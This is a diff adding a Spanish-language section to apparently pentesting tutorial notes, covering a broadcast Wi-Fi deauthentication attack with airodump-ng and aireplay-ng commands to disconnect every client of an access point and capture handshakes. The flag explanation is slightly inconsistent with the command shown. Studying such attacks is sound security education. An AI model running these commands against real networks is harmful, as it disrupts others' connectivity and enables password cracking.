@@ -280,3 +280,34 @@ Este video explica cómo realizar un ataque de deautenticación dirigido para fo
 - Algunos APs empresariales detectan ataques de deautenticación
 - WPA3 implementa protección contra este tipo de ataques
 - Este ataque es detectable por sistemas de detección de intrusiones inalámbricas (WIDS)
+
+## 10. Ataque de Deautenticación global (Broadcast MAC Address)
+
+Este video muestra una variante más agresiva del ataque de deautenticación, dirigida a todos los clientes de una red simultáneamente.
+
+### Diferencias con el ataque dirigido:
+- Afecta a todos los clientes conectados al AP
+- Más efectivo para capturar handshakes en redes con múltiples clientes
+- Muy visible para administradores de red y sistemas de seguridad
+
+### Procedimiento técnico:
+1. Identificar el AP objetivo:
+   ```bash
+   airodump-ng -c [canal] --bssid [MAC_del_AP] -w captura wlan0mon
+   ```
+
+2. Ejecutar el ataque de deautenticación global:
+   ```bash
+   aireplay-ng -0 10 -e [BSSID_del_AP] wlan0mon
+   ```
+   Donde:
+   - `-0` indica ataque de deautenticación
+   - `10` es el número de paquetes a enviar (más que en el ataque dirigido). Si queremos mandar un nº ilimitado de paquetes (hasta que hagamos ctl C) debemos poner como número de paquetes “0”
+   - `-a` especifica el BSSID del AP
+   - `-e` especifica el ESSID del AP
+   - La ausencia de `-c` hace que el ataque sea broadcast
+
+Otra forma similar:
+```bash
+aireplay-ng -0 <numPaquetes> -e <nombreRed> -c FF:FF:FF:FF:FF:FF <nombreTarjetaRed>
+```
